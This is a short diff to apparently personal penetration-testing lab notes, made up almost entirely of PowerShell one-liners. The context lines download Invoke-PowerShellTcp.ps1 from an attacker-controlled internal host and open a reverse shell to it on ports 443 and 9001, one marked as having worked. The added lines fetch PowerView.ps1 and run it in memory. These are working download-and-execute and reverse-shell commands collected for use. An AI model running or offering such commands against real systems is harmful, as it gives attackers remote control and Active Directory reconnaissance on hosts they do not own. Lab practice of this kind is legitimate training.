@@ -56,3 +56,7 @@ Reverse shell using Invoke-PowerShellTCP:
 powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443 #function name changed to power
 
 powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.36/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.36 -Port 9001 #this one worked
+
+Dowload Powerview.ps1 and execute in-memory:
+
+iex (iwr http://172.16.100.36:8080/PowerView.ps1 -UseBasicParsing)
